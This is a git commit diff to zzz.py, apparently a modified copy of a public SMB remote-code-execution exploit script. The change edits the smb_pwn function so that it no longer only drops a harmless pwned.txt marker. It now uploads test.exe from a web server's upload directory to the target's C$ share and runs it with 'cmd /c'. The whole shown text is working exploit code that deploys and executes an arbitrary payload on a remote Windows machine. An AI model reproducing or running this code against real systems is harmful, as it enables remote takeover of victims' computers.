39409f06f42c419dcf5547a8b495960167955e98
bravery9 <34338448+bravery9@users.noreply.github.com>
2018-07-10 23:56:26 +0700

    update

--- zzz.py
+++ zzz.py
@@ -975,10 +975,12 @@ def smb_pwn(conn, arch):
 	print('creating file c:\\pwned.txt on the target')
 	tid2 = smbConn.connectTree('C$')
 	fid2 = smbConn.createFile(tid2, '/pwned.txt')
-	smbConn.closeFile(tid2, fid2)
-	smbConn.disconnectTree(tid2)
+	print('Exploit....')
 	smb_send_file(smbConn, '/opt/WEB/tomcat8080/webapps/vnptweb/upload/images/t/test.exe', 'C', '/test.exe')
 	service_exec(conn, r'cmd /c c:\\test.exe')
+	smbConn.closeFile(tid2, fid2)
+	smbConn.disconnectTree(tid2)
+
 
 	#smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
 	#service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
